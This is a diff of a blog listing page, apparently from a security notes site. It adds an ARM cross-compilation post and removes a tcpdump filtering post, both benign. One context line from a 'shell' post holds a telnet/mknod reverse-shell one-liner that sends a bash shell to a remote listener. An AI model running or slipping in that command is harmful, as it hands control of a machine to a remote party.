@@ -170,6 +170,21 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>arm交叉编译
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>arm交叉编译 环境搭建 //arm交叉编译链接工具：sudo apt-get install gcc-arm-linux-gnueabi g&#43;&#43;-arm-linux-gnueabi//arm浮点型交叉编译链接工具：sudo apt-get install gcc-arm-linux-gnueabihf g&#43;&#43;-arm-linux-gnueabihf 编译 //arm_test.cinclude &lt;stdio.h&gt;int main(void){printf(&#34;hello world\n&#34;);return 0;} 同样，如果直接编译的话，是动态编译：
+arm-linux-gnueabi-gcc arm_test.c -o test 需要使用qemu的-L参数指定动态链接库：
+qemu-arm-static -L /usr/arm-linux-gnueabi test 也可以使用使用静态链接：
+arm-linux-gnueabi-gcc arm_test.c -static -o test </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to arm交叉编译" href="https://jellyfish-pro.github.io/note/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>ida未正确识别数据类型
     </h2>
   </header>
@@ -314,27 +329,6 @@ rm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 &lt; /tmp/f |/bin/bash &gt
   </div>
   <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
   <a class="entry-link" aria-label="post link to shell" href="https://jellyfish-pro.github.io/note/shell/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>tcpdump快速使用
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>在windows上可以使用burpsuite进行抓包。但burpsuite在linux上不便于安装。
-在linux上我们可以使用tcpdump命令。
-具体安装流程我们略过，如要安装可以直接百度。
-通过host参数进行IP地址过滤：
-tcpdump -n host 192.168.110.129 -n表示不把ip解析成域名
-scr可以筛选来源地址：
-tcpdump scr 192.168.110.129 dst可以筛选目的地址：
-tcpdump dst 192.168.110.129 port指定端口
-tcpdump port 8080 若要指定协议，则直接输入就好了：
-tcpdump tcp或者tcpdump icmp </p>
-  </div>
-  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to tcpdump快速使用" href="https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
